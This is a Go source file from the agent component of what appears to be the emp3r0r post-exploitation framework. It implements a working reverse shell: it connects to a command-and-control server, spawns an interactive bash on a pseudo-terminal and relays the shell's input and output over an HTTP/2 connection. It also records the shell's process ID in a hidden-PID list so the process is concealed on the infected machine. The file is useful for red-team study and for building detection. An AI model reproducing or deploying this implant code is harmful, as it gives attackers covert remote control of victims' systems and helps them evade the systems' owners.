package agent

import (
	"bytes"
	"context"
	"log"
	"os"
	"os/exec"
	"os/signal"
	"strconv"
	"syscall"
	"time"

	"github.com/creack/pty"
	"github.com/jm33-m0/emp3r0r/core/lib/tun"
	"github.com/jm33-m0/emp3r0r/core/lib/util"
	"github.com/posener/h2conn"
)

// ActivateShell launch reverse shell and send it to CC
func ActivateShell(token string) (err error) {
	var (
		rshellURL = CCAddress + tun.ReverseShellAPI + "/" + token
		shellPID  = 0 // PID of the bash shell

		// buffer for reverse shell
		sendcc = make(chan []byte)
		recvcc = make(chan []byte)

		// connection
		conn   *h2conn.Conn // reverse shell uses this connection
		ctx    context.Context
		cancel context.CancelFunc
	)

	// connect CC
	conn, ctx, cancel, err = ConnectCC(rshellURL)
	log.Print("reverseBash started")

	// clean up connection and bash
	cleanup := func() {
		cancel()
		proc, err := os.FindProcess(shellPID)
		if err != nil {
			log.Print("bash shell already gone: ", err)
		}
		err = proc.Kill()
		if err != nil {
			log.Print("Killing bash: ", err)
		}
		err = conn.Close()
		if err != nil {
			log.Print("Closing reverseBash connection: ", err)
		}
		log.Print("bash shell has been cleaned up")
	}
	defer cleanup()

	go reverseShell(ctx, cancel, sendcc, recvcc, &shellPID, token)

	go func() {
		for {
			select {
			case <-ctx.Done():
				return
			default:
				// if connection does not exist yet
				if conn == nil {
					time.Sleep(100 * time.Millisecond)
					continue
				}
				data := make([]byte, RShellBufSize)
				_, err = conn.Read(data)
				if err != nil {
					log.Print("Read remote: ", err)
					cancel()
					return
				}
				data = bytes.Trim(data, "\x00")
				recvcc <- data
			}
		}
	}()

	for outgoing := range sendcc {
		select {
		case <-ctx.Done():
			return
		default:
			// if connection does not exist yet
			if conn == nil {
				time.Sleep(100 * time.Millisecond)
				continue
			}
			_, err = conn.Write(outgoing)
			if err != nil {
				log.Print("Send to remote: ", err)
				return
			}
		}
	}
	return
}

// reverseShell - Execute a reverse shell to host
func reverseShell(ctx context.Context, cancel context.CancelFunc,
	send chan<- []byte, recv <-chan []byte, pid *int,
	token string) {

	send <- []byte(token)
	log.Printf("Sent token %s", token)

	// shell command
	// check if we have utilities installed
	cmd := exec.Command("/bin/bash", "-i")
	if util.IsFileExist(UtilsPath + "/bash") {
		cmd = exec.Command(UtilsPath+"/bash", "--rcfile", UtilsPath+"/.bashrc", "-i")
	}

	initWinSize := pty.Winsize{Rows: 23, Cols: 80}
	shellf, err := pty.StartWithSize(cmd, &initWinSize)
	if err != nil {
		log.Print("start bash: ", err)
		return
	}
	*pid = cmd.Process.Pid

	// record this PID
	HIDE_PIDS = append(HIDE_PIDS, strconv.Itoa(*pid))
	err = UpdateHIDE_PIDS()
	if err != nil {
		log.Print(err)
	}

	// Handle pty size.
	ch := make(chan os.Signal, 1)
	signal.Notify(ch, syscall.SIGWINCH)
	go func() {
		defer func() { cancel() }()
		// TODO delete PID from HIDE_PIDS
		for range ch {
			select {
			case <-ctx.Done():
				return
			default:
				if err := pty.InheritSize(os.Stdin, shellf); err != nil {
					log.Printf("error resizing pty: %s", err)
				}
			}
		}
	}()
	ch <- syscall.SIGWINCH // Initial resize.

	defer func() {
		cancel()
		err = shellf.Close()
		if err != nil {
			log.Print("Closing shellf: ", err)
		}
		log.Print("reverseShell exited")
	}()

	// write CC's input to bash's PTY stdin
	go func() {
		defer func() { cancel() }()
		for incoming := range recv {
			incoming = bytes.Trim(incoming, "\x00") // trim NULL bytes
			select {
			case <-ctx.Done():
				return
			default:
				_, err := shellf.Write(incoming)
				if err != nil {
					log.Print("shell write stdin: ", err)
					return
				}
			}
		}
	}()

	// read from bash's PTY output
	for {
		select {
		case <-ctx.Done():
			return
		default:
			buf := make([]byte, RShellBufSize)
			_, err = shellf.Read(buf)
			// fmt.Printf("%s", buf) // echo CC's console
			send <- buf
			if err != nil {
				log.Print("shell read: ", err)
				return
			}
		}
	}
}
